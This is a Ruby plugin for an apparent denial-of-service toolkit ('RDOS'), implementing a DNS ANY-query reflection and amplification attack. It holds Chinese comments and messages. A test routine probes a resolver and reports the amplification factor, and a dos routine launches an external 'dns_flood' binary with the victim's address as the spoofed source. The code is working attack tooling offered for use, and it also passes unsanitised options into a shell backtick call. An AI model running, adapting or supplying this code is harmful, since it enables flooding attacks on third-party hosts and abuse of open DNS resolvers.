#encoding: utf-8

require 'resolv'
require 'socket'
require 'packetfu'

module RDOS

  module PLUGIN

    class Dns_Rd_Any < Base

      def init
        plugin_name = "dns_rd_any"
        plugin_desc = "DNS递归查询反射攻击,ANY方式"
        need_args = {'#{plugin_name}_Query' => ['-q', '--query <dns>', '查询的dns域名']}
        update_info(plugin_name, plugin_desc, need_args)
      end

      def test
        reflect = RDOS::Options['Reflect']

        #eth ip udp头大小
        append_length = 42
        #检查环境变量：
        if reflect.nil? or RDOS::Options['#{plugin_name}_Query'].nil?
            $stdout.puts "参数错误，请提供必须参数"
            exit
        end

        $stdout.puts "检测主机：#{reflect}\n"     
        req = Resolv::DNS::Message.new
        req.add_question(RDOS::Options['#{plugin_name}_Query'], Resolv::DNS::Resource::IN::ANY)
        req.rd = 1
        p req

        req_encode = req.encode
        #req_encode = "\x00" + [].push(req_encode.length.to_s(16)).pack('H*') + req_encode

        u1 = UDPSocket.new
        l = u1.send req_encode, 0, reflect, 53
        l = l + append_length
        $stdout.puts "发送测试数据包，查询域名：#{RDOS::Options['#{plugin_name}_Query']}, 查询DNS服务器: #{reflect}, 发送数据包大小：#{l}\n"

        $stdout.puts "正在等待应答....\n"
        res, addr = u1.recvfrom(65535)

        rlength = res.length + append_length
        $stdout.puts "获得应答，返回数据大小：#{rlength}\n"
        if res and res.length > 0
            res = Resolv::DNS::Message.decode(res)
            p res
            res.each_answer do |name, ttl, data|
                #$stdout.puts "#{name.to_s}\t#{ttl}\t#{data.address}\n"
                $stdout.puts "#{name}\t#{ttl}\t#{data}\n"
            end
        end

        n = (rlength.to_f / l.to_f * 100).to_i.to_f / 100.to_f
        $stdout.puts "\n放大倍数：#{n}\n"

        if res.ra == 1 then
            $stdout.puts "\ncheck success：#{reflect}\n"
            return true
        else
            $stdout.puts "\ncheck error：#{reflect}\n"
            return false
        end
      end

      def dos
        #检查环境变量：
        reflect = Resolv.getaddress(RDOS::Options['Reflect'])
        target = Resolv.getaddress(RDOS::Options['Target'])
        query = RDOS::Options['#{plugin_name}_Query']
        if reflect.nil? or query.nil? or target.nil?
            $stdout.puts "参数错误，请提供必须参数"
            exit
        end
        
        flood_cmd = File.join(RDOS::Rdosbin_dir, "dns_flood")
        flood_args = "#{query} #{reflect} -s #{target} -t ANY"
        $stdout.puts "启动攻击程序： #{flood_cmd} #{flood_args}"
        `#{flood_cmd} #{flood_args}`
      end

    end

  end

end
